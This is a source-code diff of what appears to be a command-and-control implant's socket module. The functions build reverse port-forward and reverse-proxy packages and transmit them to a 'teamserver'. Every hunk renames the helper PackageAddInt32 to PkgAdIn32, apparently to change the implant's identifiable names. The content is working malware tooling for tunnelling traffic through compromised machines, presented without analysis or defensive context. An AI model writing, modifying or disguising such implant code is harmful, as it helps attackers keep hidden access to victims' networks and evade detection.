@@ -248,16 +248,16 @@ VOID SocketClients()
                     Package = PackageCreate( DEMON_COMMAND_SOCKET );
 
                     /* socket package header */
-                    PackageAddInt32( Package, SOCKET_COMMAND_OPEN );
-                    PackageAddInt32( Package, Client->ID );
+                    PkgAdIn32( Package, SOCKET_COMMAND_OPEN );
+                    PkgAdIn32( Package, Client->ID );
 
                     /* Local Host & Port data */
-                    PackageAddInt32( Package, Client->IPv4 );
-                    PackageAddInt32( Package, Client->LclPort );
+                    PkgAdIn32( Package, Client->IPv4 );
+                    PkgAdIn32( Package, Client->LclPort );
 
                     /* Forward Host & Port data */
-                    PackageAddInt32( Package, Client->FwdAddr );
-                    PackageAddInt32( Package, Client->FwdPort );
+                    PkgAdIn32( Package, Client->FwdAddr );
+                    PkgAdIn32( Package, Client->FwdPort );
 
                     /* Send the socket open request */
                     PackageTransmit( Package );
@@ -380,10 +380,10 @@ VOID SocketRead()
                 Package = PackageCreate( DEMON_COMMAND_SOCKET );
 
                 /* tell the teamserver to write to the socket of the forwarded host */
-                PackageAddInt32( Package, SOCKET_COMMAND_READ );
-                PackageAddInt32( Package, Socket->ID );
-                PackageAddInt32( Package, Socket->Type );
-                PackageAddInt32( Package, TRUE );
+                PkgAdIn32( Package, SOCKET_COMMAND_READ );
+                PkgAdIn32( Package, Socket->ID );
+                PkgAdIn32( Package, Socket->Type );
+                PkgAdIn32( Package, TRUE );
 
                 /* add the data we read from the client socket */
                 PackageAddBytes( Package, FullData.Buffer, FullData.Length );
@@ -398,11 +398,11 @@ VOID SocketRead()
                 Package = PackageCreate( DEMON_COMMAND_SOCKET );
 
                 /* notify the teamserver of the error */
-                PackageAddInt32( Package, SOCKET_COMMAND_READ );
-                PackageAddInt32( Package, Socket->ID );
-                PackageAddInt32( Package, Socket->Type );
-                PackageAddInt32( Package, FALSE );
-                PackageAddInt32( Package, ErrorCode );
+                PkgAdIn32( Package, SOCKET_COMMAND_READ );
+                PkgAdIn32( Package, Socket->ID );
+                PkgAdIn32( Package, Socket->Type );
+                PkgAdIn32( Package, FALSE );
+                PkgAdIn32( Package, ErrorCode );
 
                 /* now let's send it */
                 PackageTransmit( Package );
@@ -435,17 +435,17 @@ VOID SocketFree( PSOCKET_DATA Socket )
         Package = PackageCreate( DEMON_COMMAND_SOCKET );
 
         /* socket package header */
-        PackageAddInt32( Package, SOCKET_COMMAND_RPORTFWD_REMOVE );
-        PackageAddInt32( Package, Socket->ID );
-        PackageAddInt32( Package, Socket->Type );
+        PkgAdIn32( Package, SOCKET_COMMAND_RPORTFWD_REMOVE );
+        PkgAdIn32( Package, Socket->ID );
+        PkgAdIn32( Package, Socket->Type );
 
         /* Local Host & Port data */
-        PackageAddInt32( Package, Socket->IPv4 );
-        PackageAddInt32( Package, Socket->LclPort );
+        PkgAdIn32( Package, Socket->IPv4 );
+        PkgAdIn32( Package, Socket->LclPort );
 
         /* Forward Host & Port data */
-        PackageAddInt32( Package, Socket->FwdAddr );
-        PackageAddInt32( Package, Socket->FwdPort );
+        PkgAdIn32( Package, Socket->FwdAddr );
+        PkgAdIn32( Package, Socket->FwdPort );
 
         /* Send the socket open request */
         PackageTransmit( Package );
@@ -459,9 +459,9 @@ VOID SocketFree( PSOCKET_DATA Socket )
         Package = PackageCreate( DEMON_COMMAND_SOCKET );
 
         /* socket package header */
-        PackageAddInt32( Package, SOCKET_COMMAND_CLOSE );
-        PackageAddInt32( Package, Socket->ID );
-        PackageAddInt32( Package, SOCKET_TYPE_REVERSE_PROXY );
+        PkgAdIn32( Package, SOCKET_COMMAND_CLOSE );
+        PkgAdIn32( Package, Socket->ID );
+        PkgAdIn32( Package, SOCKET_TYPE_REVERSE_PROXY );
 
         /* Send the socket open request */
         PackageTransmit( Package );
